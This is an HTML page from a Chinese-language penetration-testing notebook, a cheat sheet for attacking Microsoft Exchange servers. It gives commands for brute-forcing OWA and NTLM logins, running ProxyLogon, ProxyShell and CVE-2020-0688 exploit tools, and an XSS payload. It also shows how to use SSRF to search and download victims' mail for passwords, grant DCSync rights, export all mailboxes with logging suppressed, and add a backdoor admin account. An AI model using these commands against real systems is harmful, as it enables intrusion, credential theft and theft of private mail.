@@ -1,0 +1,421 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Exchange攻击面 - Share Docs</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "title: Exchange\u653b\u51fb\u9762 date: 2021-11-09 10:13:20", url: "#_top", children: [
+          ]},
+          {title: "\u5728\u5185\u7f51\u4e2d\u5b9a\u4f4dexchange", url: "#exchange", children: [
+              {title: "ldapsearch", url: "#ldapsearch" },
+              {title: "SPN\u67e5\u8be2", url: "#spn" },
+          ]},
+          {title: "\u7248\u672c\u8bc6\u522b", url: "#_1", children: [
+          ]},
+          {title: "\u53ef\u4e0a\u4f20shell\u7684\u8def\u5f84", url: "#shell", children: [
+          ]},
+          {title: "\u679a\u4e3e\u7528\u6237", url: "#_2", children: [
+          ]},
+          {title: "\u7206\u7834\u5bc6\u7801", url: "#_3", children: [
+              {title: "burp\u7206\u7834OWA", url: "#burpowa" },
+              {title: "autodiscover\u63a5\u53e3\u7206\u7834", url: "#autodiscover" },
+              {title: "EBurst\u6279\u91cf\u63a5\u53e3NTLM\u7206\u7834", url: "#eburstntlm" },
+          ]},
+          {title: "CVE-2019-1040", url: "#cve-2019-1040", children: [
+          ]},
+          {title: "CVE-2020-0688-\u9700\u8981\u8ba4\u8bc1\u7684\u53cd\u5e8f\u5217\u5316RCE", url: "#cve-2020-0688-rce", children: [
+          ]},
+          {title: "CVE-2020-16875", url: "#cve-2020-16875", children: [
+          ]},
+          {title: "CVE-2020-17144-Exchange2010", url: "#cve-2020-17144-exchange2010", children: [
+          ]},
+          {title: "ProxyLogon-\u7ec4\u5408RCE", url: "#proxylogon-rce", children: [
+              {title: "CVE-2021-26855\uff08SSRF\uff09", url: "#cve-2021-26855ssrf" },
+              {title: "CVE-2021-27065\uff08\u4efb\u610f\u6587\u4ef6\u5199\u5165\uff09", url: "#cve-2021-27065" },
+          ]},
+          {title: "ProxyOracle-\u6ca1\u591a\u5927\u7528", url: "#proxyoracle-", children: [
+              {title: "CVE-2021-31195-\u53cd\u5c04\u578b\u8de8\u7ad9\u811a\u672c\u6f0f\u6d1e", url: "#cve-2021-31195-" },
+              {title: "CVE-2021-31196-Padding Oracle", url: "#cve-2021-31196-padding-oracle" },
+          ]},
+          {title: "ProxyShell-\u7ec4\u5408RCE", url: "#proxyshell-rce", children: [
+              {title: "RCE\u5229\u7528", url: "#rce" },
+          ]},
+          {title: "\u6ca1\u6cd5RCE\u4f46\u5b58\u5728\u6f0f\u6d1e\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u7528\u4e0b\u9762\u7684\u529e\u6cd5", url: "#rce_1", children: [
+              {title: "\u679a\u4e3e\u90ae\u7bb1", url: "#_6" },
+              {title: "\u6307\u5b9a\u7528\u6237\u641c\u7d22\u8054\u7cfb\u4eba", url: "#_7" },
+              {title: "\u641c\u7d22\u90ae\u4ef6\u5e76\u4e0b\u8f7d", url: "#_8" },
+              {title: "\u4e0b\u8f7d\u6307\u5b9a\u90ae\u7bb1\u7684\u90ae\u4ef6", url: "#_9" },
+          ]},
+          {title: "CVE-2021-33768-\u6682\u65e0", url: "#cve-2021-33768-", children: [
+          ]},
+          {title: "Exchange\u540e\u6e17\u900f", url: "#exchange_1", children: [
+              {title: "\u4eceexchange\u670d\u52a1\u4e0a\u83b7\u53d6\u90ae\u7bb1\u3001\u7528\u6237", url: "#exchange_2" },
+              {title: "\u901a\u8fc7Exchange\u8fdb\u884cdcsync", url: "#exchangedcsync" },
+              {title: "\u5728Exchange\u670d\u52a1\u5668\u4e0a\u641c\u7d22\u90ae\u4ef6", url: "#exchange_3" },
+              {title: "\u5728Exchange\u670d\u52a1\u5668\u4e0a\u5bfc\u51fa\u90ae\u4ef6", url: "#exchange_4" },
+              {title: "\u547d\u4ee4\u884c\u4e0b\u6dfb\u52a0Exchange\u7ba1\u7406\u5458\u7528\u6237", url: "#exchange_5" },
+              {title: "\u901a\u8baf\u5f55\u5bfc\u51fa", url: "#_12" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Linux%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Linux%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-link">
+        Linux技巧
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Empire%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Empire%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-link">
+        Empire笔记
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h3 id="title-exchange-date-2021-11-09-101320">title: Exchange攻击面 date: 2021-11-09 10:13:20</h3>
+<h2 id="exchange">在内网中定位exchange</h2>
+<h3 id="ldapsearch">ldapsearch</h3>
+<p>过滤条件可以是</p>
+<p>cn=Exchange Servers name=Exchange Servers sAMAccountName=Exchange Servers</p>
+<pre><code class="language-text-plain">ldapsearch -x -h 192.168.0.66 -D &quot;test@klion.local&quot; -b &quot;DC=klion,DC=local&quot; -w &quot;Aa123456&quot; &quot;cn=Exchange Servers&quot; 
+</code></pre>
+<h3 id="spn">SPN查询</h3>
+<p>需要在域内</p>
+<pre><code class="language-text-plain">setspn -Q IMAP/*
+</code></pre>
+<h2 id="_1">版本识别</h2>
+<p>根据F12中的内部版本号来查询，如15.2.986.9</p>
+<p>https://docs.microsoft.com/zh-cn/Exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019</p>
+<h2 id="shell">可上传shell的路径</h2>
+<p>| <strong>FileName</strong> | <strong>Path</strong> | | ------------ | ------------------------------------------------------------------------- | | zz.aspx | C:\ProgramFiles\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth | | zz.ashx | C:\inetpub\wwwroot\aspnet_client | | zz.ashx | C:\ProgramFiles\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth |</p>
+<h2 id="_2">枚举用户</h2>
+<h2 id="_3">爆破密码</h2>
+<p>分常规爆破和NTLM验证爆破，对于限制了登录次数的情况下，可以尝试对NTLM验证的接口进行爆破，常用接口如下</p>
+<pre><code class="language-text-plain">/Autodiscover/Autodiscover.xml  # 自 Exchange Server 2007 开始推出的一项自动服务,用于自动配置用户在Outlook中邮箱的相关设置,简化用户登录使用邮箱的流程。
+/Microsoft-Server-ActiveSync/default.eas
+/Microsoft-Server-ActiveSync    # 用于移动应用程序访问电子邮件
+/Autodiscover
+/Rpc/                           # 早期的 Outlook 还使用称为 Outlook Anywhere 的 RPC 交互
+/EWS/Exchange.asmx
+/EWS/Services.wsdl
+/EWS/                           # Exchange Web Service,实现客户端与服务端之间基于HTTP的SOAP交互
+/OAB/                           # 用于为Outlook客户端提供地址簿的副本,减轻 Exchange 的负担
+/owa                            # Exchange owa 接口,用于通过web应用程序访问邮件、日历、任务和联系人等
+/ecp                            # Exchange 管理中心,管理员用于管理组织中的Exchange 的Web控制台
+/Mapi                           # Outlook连接 Exchange 的默认方式,在2013和2013之后开始使用,2010 sp2同样支持
+/powershell                     # 用于服务器管理的 Exchange 管理控制台
+</code></pre>
+<h3 id="burpowa">burp爆破OWA</h3>
+<p>owa登录口爆破，简单粗暴</p>
+<p><img alt="" src="api/images/E4ZjOSZBT00W/uVxhv4OgmrY5Wbk.jpg" /></p>
+<h3 id="autodiscover">autodiscover接口爆破</h3>
+<p>对NTLM验证爆破，user是以用户名形式</p>
+<p>https://github.com/sensepost/ruler</p>
+<p><img alt="" src="api/images/6i005gVELPxQ/yrmDXTNCowq7JKi.jpg" /></p>
+<h3 id="eburstntlm">EBurst批量接口NTLM爆破</h3>
+<p>https://github.com/grayddq/EBurst</p>
+<p>支持多个接口爆破，如果要正常使用还需要修改脚本。关于SSL证书的问题。</p>
+<p>使用前先检测接口可用性</p>
+<p><img alt="" src="api/images/85Klj74Iy3qW/gXL2Z3KjP6MuifB.jpg" /></p>
+<p><img alt="" src="api/images/peKs3La8kCvU/sbCVGzZgFKfHJBU.jpg" /></p>
+<h2 id="cve-2019-1040">CVE-2019-1040</h2>
+<p>适用内网，中继攻击。</p>
+<p>https://github.com/Ridter/CVE-2019-1040</p>
+<h2 id="cve-2020-0688-rce">CVE-2020-0688-需要认证的反序列化RCE</h2>
+<p>密钥硬编码导致的反序列RCE，简单粗暴，需要一个用户</p>
+<pre><code class="language-text-plain">.\ExchangeCmd.exe 192.168.0.16 test@klion.local Aa123456
+</code></pre>
+<p><img alt="" src="api/images/HBDXw1ptL5PX/4lILkopa6GuKZPy.jpg" /></p>
+<h2 id="cve-2020-16875">CVE-2020-16875</h2>
+<p>反序列化，脚本直接利用，执行命令，需要一个用户</p>
+<p>https://srcincite.io/pocs/cve-2020-16875.py.txt</p>
+<h2 id="cve-2020-17144-exchange2010">CVE-2020-17144-Exchange2010</h2>
+<p>只能打2010，C#工具利用，修改ExploitClass.cs来指定shell</p>
+<p>https://github.com/Airboi/CVE-2020-17144-EXP</p>
+<p>或者使用这个来直接写shell</p>
+<p>https://github.com/zcgonvh/CVE-2020-17144</p>
+<h2 id="proxylogon-rce">ProxyLogon-组合RCE</h2>
+<p>这个python3</p>
+<p>https://github.com/p0wershe11/ProxyLogon</p>
+<p>这个python2</p>
+<p>https://github.com/hausec/ProxyLogon</p>
+<p><img alt="" src="api/images/ftJ9HBFmYFTF/jz2GxZKDv6WiMVd.jpg" /></p>
+<p><img alt="" src="api/images/65a9nuPSjaMK/1gPv784smIlZ3pC.jpg" /></p>
+<h3 id="cve-2021-26855ssrf">CVE-2021-26855（SSRF）</h3>
+<p>无需身份验证的SSRF漏洞导致身份验证绕过。</p>
+<h3 id="cve-2021-27065">CVE-2021-27065（任意文件写入）</h3>
+<p>需要经过身份验证的任意文件写入漏洞导致RCE。</p>
+<h2 id="proxyoracle-">ProxyOracle-没多大用</h2>
+<p>利用xss拿到cookie后进行Padding Oracle，可能拿到账户密码？</p>
+<h3 id="cve-2021-31195-">CVE-2021-31195-反射型跨站脚本漏洞</h3>
+<pre><code class="language-text-plain">/owa/auth/frowny.aspx?app=people&amp;et=ServerError&amp;esrc=MasterPage&amp;te=\&amp;refurl=}}};alert(document.domain)//
+</code></pre>
+<h3 id="cve-2021-31196-padding-oracle">CVE-2021-31196-Padding Oracle</h3>
+<h2 id="proxyshell-rce">ProxyShell-组合RCE</h2>
+<p>CVE-2021-34473+CVE-2021-34523+CVE-2021-31207</p>
+<h3 id="rce">RCE利用</h3>
+<p>注：任意文件写入的实现方式在一键脚本中是采取发送一封邮件再进行导出邮件的方式</p>
+<p>1、使用WsMan协议调用exchange powershell接口的New-MailboxExportRequest</p>
+<p>2、使用PST编码异或一次的payload，以便让邮件导出时的payload能够得到解码</p>
+<p>payload加密工具https://github.com/Ridter/proxyshell_payload</p>
+<p>3、然后使用得到的token，将加密的payload 发送指定接口</p>
+<h4 id="_4">先确定存在的邮箱</h4>
+<pre><code class="language-text-plain"> python .\exchange_ssrf_attacks.py --target 1.1.1.1 --action Get
+</code></pre>
+<p>或者</p>
+<pre><code class="language-text-plain">python .\proxyshell-enumerate.py -u https://1.1.1.1/
+</code></pre>
+<p><img alt="" src="api/images/vvCjPfOoIcl8/oyF27mUVbhNWxQT.jpg" /></p>
+<h4 id="_5">一键利用</h4>
+<p>https://github.com/dmaasland/proxyshell-poc/blob/main/proxyshell_rce.py</p>
+<p>https://github.com/Udyz/proxyshell-auto/blob/main/proxyshell.py</p>
+<p>自动枚举邮箱</p>
+<pre><code class="language-text-plain">python .\proxyshell.py -t 1.1.1.1
+</code></pre>
+<p>上面这个工具可控制写入的payload，指定payload参数来控制webshell的内容</p>
+<p>指定邮箱</p>
+<pre><code class="language-text-plain">python .\proxyshell_rce.py -u https://1.1.1.1 -e ac@exp.com
+</code></pre>
+<p>上面这个工具是直接把加密好的payload写进去了。</p>
+<p>如下图proxyshell.py失败了，但proxyshell_rce.py成功了。proxyshell_rce.py效果似乎比proxyshell.py更好用</p>
+<h2 id="rce_1">没法RCE但存在漏洞的时候，可以用下面的办法</h2>
+<p>https://github.com/Jumbo-WJB/Exchange_SSRF</p>
+<h3 id="_6">枚举邮箱</h3>
+<pre><code class="language-text-plain">python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Brute --file /tmp/emails.txt
+</code></pre>
+<h3 id="_7">指定用户搜索联系人</h3>
+<pre><code class="language-text-plain">python Exchange_SSRF_Attacks.py --target mail.exchange.com --action SearchC --email validuser@exchange.com --keyword test
+</code></pre>
+<h3 id="_8">搜索邮件并下载</h3>
+<pre><code class="language-text-plain">python Exchange_SSRF_Attacks.py --target mail.exchange.com --action SearchM --email userwantdown@exchange.com --keyword password
+</code></pre>
+<h3 id="_9">下载指定邮箱的邮件</h3>
+<pre><code class="language-text-plain">python Exchange_SSRF_Attacks.py --target mail.exchange.com --action Download --email userwantdown@exchange.com
+</code></pre>
+<h2 id="cve-2021-33768-">CVE-2021-33768-暂无</h2>
+<h2 id="exchange_1">Exchange后渗透</h2>
+<h3 id="exchange_2">从exchange服务上获取邮箱、用户</h3>
+<pre><code class="language-text-plain">powershell -exec bypass -command Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;Get-Mailbox | format-table Name,WindowsEmailAddress
+</code></pre>
+<h3 id="exchangedcsync">通过Exchange进行dcsync</h3>
+<p>使用powerview为exchange机器用户添加dcsync权限</p>
+<pre><code class="language-text-plain">PS&gt;Import-Module .\powerview.ps1
+PS&gt;Add-DomainObjectAcl -TargetIdentity 'DC=test,DC=local' -PrincipalIdentity exchange2016$ -Rights DCSync -Verbose}&quot;
+</code></pre>
+<h3 id="exchange_3">在Exchange服务器上搜索邮件</h3>
+<pre><code>实现代码已上传至github，地址如下：
+
+https://github.com/3gstudent/Homework-of-Powershell/blob/master/DirectSearchMailfromExchange.ps1
+
+从用户test1中搜索包含单词pass的邮件并保存到用户test2的out2文件夹，参数如下：
+DirectSearchMailfromExchange -MailBox &quot;test1&quot; -Filter &quot;*pass*&quot; -TargetMailbox &quot;test2&quot; -TargetFolder &quot;out2&quot; -Version 2013
+
+
+</code></pre>
+<pre><code>搜索所有包含单词pass的邮件并保存到用户test2的outAll文件夹，参数如下：
+DirectSearchMailfromExchange -MailBox &quot;All&quot; -Filter &quot;*pass*&quot; -TargetMailbox &quot;test2&quot; -TargetFolder &quot;outAll&quot; -Version 2013
+</code></pre>
+<h4 id="1">补充1：搜索邮件的常用命令</h4>
+<p>(1)枚举所有邮箱用户，显示包含关键词pass的邮件的数量</p>
+<pre><code>Get-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -EstimateResultOnly
+</code></pre>
+<p>(2)搜索邮箱用户test1，显示包含关键词pass的邮件的数量</p>
+<pre><code>Search-Mailbox -Identity test1 -SearchQuery &quot;*pass*&quot; -EstimateResultOnly
+</code></pre>
+<p>示例如下图，数量为4个</p>
+<p>(3)枚举所有邮箱用户，导出包含关键词pass的邮件至用户test2的文件夹out中(不保存日志)：</p>
+<pre><code>Get-Mailbox|Search-Mailbox -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;test2&quot; -TargetFolder &quot;out&quot; -LogLevel Suppress
+</code></pre>
+<p>(4)搜索邮箱用户test1，导出包含关键词pass的邮件至用户test2的文件夹out中(不保存日志)：</p>
+<pre><code>Search-Mailbox -Identity test1 -SearchQuery &quot;*pass*&quot; -TargetMailbox &quot;test2&quot; -TargetFolder &quot;out&quot; -LogLevel Suppress
+
+
+</code></pre>
+<h3 id="exchange_4">在Exchange服务器上导出邮件</h3>
+<h4 id="_10">第一种方式流程如下：</h4>
+<p>1.使用PSSession连接到Exchange服务器 2.判断使用的用户是否被加入到角色组”Mailbox Import Export” 如果未被添加，需要添加用户 3.导出邮件并保存至Exchange服务器的c:\test，格式为pst文件 4.如果新添加了用户，那么会将用户移除角色组”Mailbox Import Export” 5.清除PSSession</p>
+<p>导出的pst文件使用Outlook打开即可</p>
+<pre><code>(1)将用户添加到角色组”Mailbox Import Export”
+这里以用户administrator为例：
+
+New-ManagementRoleAssignment –Role &quot;Mailbox Import Export&quot; –User Administrator
+补充：移除的命令
+
+Remove-ManagementRoleAssignment -Identity &quot;Mailbox Import Export-Administrator&quot; -Confirm:$false
+添加后再次查看进行确认：
+
+Get-ManagementRoleAssignment –Role &quot;Mailbox Import Export&quot;|fl user
+(2)重新启动Powershell
+否则，无法使用命令New-MailboxexportRequest
+
+(3)导出邮件并保存
+1.导出指定用户的所有邮件，保存到Exchange服务器的c:\test
+
+$User = &quot;test1&quot;
+New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\test\&quot;+$User+&quot;.pst&quot;)
+2.筛选出指定用户的body中包含单词pass的邮件，保存到Exchange服务器的c:\test
+
+$User = &quot;test1&quot;
+New-MailboxexportRequest -mailbox $User -ContentFilter {(body -like &quot;*pass*&quot;)} -FilePath (&quot;\\localhost\c$\test\&quot;+$User+&quot;.pst&quot;)
+3.导出所有邮件，保存到Exchange服务器的c:\test
+
+Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%{New-MailboxexportRequest -mailbox $_.name -FilePath (&quot;\\localhost\c$\test\&quot;+($_.name)+&quot;.pst&quot;)}
+</code></pre>
+<h4 id="_11">第二种方式</h4>
+<p>注：</p>
+<p>需要指定Exchange版本</p>
+<p>流程如下：</p>
+<p>1.添加管理单元 2.导出邮件并保存至Exchange服务器的c:\test，格式为pst文件</p>
+<p>导出的pst文件使用Outlook打开即可</p>
+<pre><code>
+(1)添加管理单元
+不同Exchange版本对应的管理单元名称不同：
+
+Exchange 2007: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.Admin;
+Exchange 2010: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.E2010;
+Exchange 2013 &amp; 2016: Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;
+不需要考虑角色组，可以直接导出邮件
+
+(2)导出邮件
+导出用户test1的邮件，保存到Exchange服务器的c:\test：
+
+Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;
+$User = &quot;test1&quot;
+New-MailboxexportRequest -mailbox $User -FilePath (&quot;\\localhost\c$\test\&quot;+$User+&quot;.pst&quot;)
+
+
+
+</code></pre>
+<h3 id="exchange_5">命令行下添加Exchange管理员用户</h3>
+<pre><code>powershell -c &quot;Add-PSSnapin Microsoft.Exchange.Management.PowerShell.SnapIn;$pwd=convertto-securestring Password123 -asplaintext -force;New-Mailbox -UserPrincipalName testuser1@test.com -OrganizationalUnit test.com/Users -Alias testuser1 -Name testuser1 -DisplayName testuser1 -Password $pwd;Add-RoleGroupMember \&quot;Organization Management\&quot; -Member testuser1 -BypassSecurityGroupManagerCheck&quot;
+</code></pre>
+<h3 id="_12">通讯录导出</h3>
+<h4 id="burp">burp导出</h4>
+<p>需要对json格式进行处理一下</p>
+<p>数据包，修改MaxEntriesReturned参数来导出邮箱数量</p>
+<pre><code class="language-text-plain">POST /owa/service.svc?action=FindPeople&amp;ID=-25&amp;AC=1 HTTP/1.1
+Host: 192.168.0.16
+Cookie: xxxx
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Action: FindPeople
+Content-Type: application/json; charset=utf-8
+X-Owa-Canary: TbaZ2GpjckaBdewgr1Fzs6pk4PlEo9kIqjb4trHBtOg6bBXuxJYK2LUnStFgWPE33nzEigc2zMA.
+X-Owa-Clientbuildversion: 15.0.847.32
+X-Owa-Actionname: BrowseInDirectory
+X-Owa-Attempt: 1
+X-Owa-Actionid: -25
+X-Owa-Correlationid: 8f354010-b00c-4ca4-a8bd-89c09d03aa0c_163643741326924
+X-Owa-Clientbegin: 2021-11-09T05:56:53.269
+Referer: https://192.168.0.16/owa/
+Content-Length: 709
+Dnt: 1
+Connection: close
+
+{&quot;__type&quot;:&quot;FindPeopleJsonRequest:#Exchange&quot;,&quot;Header&quot;:{&quot;__type&quot;:&quot;JsonRequestHeaders:#Exchange&quot;,&quot;RequestServerVersion&quot;:&quot;Exchange2013&quot;,&quot;TimeZoneContext&quot;:{&quot;__type&quot;:&quot;TimeZoneContext:#Exchange&quot;,&quot;TimeZoneDefinition&quot;:{&quot;__type&quot;:&quot;TimeZoneDefinitionType:#Exchange&quot;,&quot;Id&quot;:&quot;SA Pacific Standard Time&quot;}}},&quot;Body&quot;:{&quot;__type&quot;:&quot;FindPeopleRequest:#Exchange&quot;,&quot;IndexedPageItemView&quot;:{&quot;__type&quot;:&quot;IndexedPageView:#Exchange&quot;,&quot;BasePoint&quot;:&quot;Beginning&quot;,&quot;Offset&quot;:0,&quot;MaxEntriesReturned&quot;:500},&quot;QueryString&quot;:null,&quot;ParentFolderId&quot;:{&quot;__type&quot;:&quot;TargetFolderId:#Exchange&quot;,&quot;BaseFolderId&quot;:{&quot;__type&quot;:&quot;AddressListId:#Exchange&quot;,&quot;Id&quot;:&quot;6230e129-096c-4f6a-8140-0f20d1230639&quot;}},&quot;PersonaShape&quot;:{&quot;__type&quot;:&quot;PersonaResponseShape:#Exchange&quot;,&quot;BaseShape&quot;:&quot;Default&quot;}}}
+</code></pre>
+<h4 id="ldap">ldap查询导出</h4>
+<pre><code class="language-text-plain">ldapsearch -x -h 192.168.0.66 -D &quot;test@klion.local&quot; -w Aa123456 -b &quot;DC=klion,DC=local&quot; |grep mail:
+</code></pre>
+<p><img alt="" src="api/images/TGwD2tftW2Y3/J5NtCUL72x9TF16.jpg" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Linux%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Linux%E6%8A%80%E5%B7%A7/" class="btn btn-xs btn-link">
+        Linux技巧
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Empire%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Empire%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-link">
+        Empire笔记
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
